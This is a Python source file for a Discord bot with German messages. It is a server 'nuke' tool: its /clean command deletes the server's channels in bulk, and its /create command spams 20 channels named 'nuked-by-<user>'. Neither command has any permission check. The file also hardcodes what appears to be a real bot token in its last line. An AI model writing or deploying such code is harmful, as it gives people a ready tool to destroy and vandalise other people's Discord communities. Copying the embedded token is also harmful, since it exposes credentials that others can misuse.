import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot {bot.user.name} ist bereit!")

@bot.command()
async def clean(ctx, count: int):
    channels = ctx.guild.channels
    deleted_channels = 0
    for channel in channels:
        if deleted_channels >= count:
            break
        try:
            await channel.delete()
            deleted_channels += 1
        except Exception as e:
            print(f"Fehler beim Löschen: {e}")
    await ctx.send(f"{deleted_channels} Kanäle wurden gelöscht.")

@bot.command()
async def create(ctx):
    for i in range(20):
        try:
            await ctx.guild.create_text_channel(f"nuked-by-{ctx.author.name}")
        except Exception as e:
            print(f"Fehler beim Erstellen: {e}")
    await ctx.send("20 Kanäle wurden erfolgreich erstellt!")

bot.run("MTM0OTA3MTY5NjYzNTc2MDc2MA.GjTvdK.wbg3k4IEuQsCWus_-MuYcnmzm83NOGbLPvj5KU")
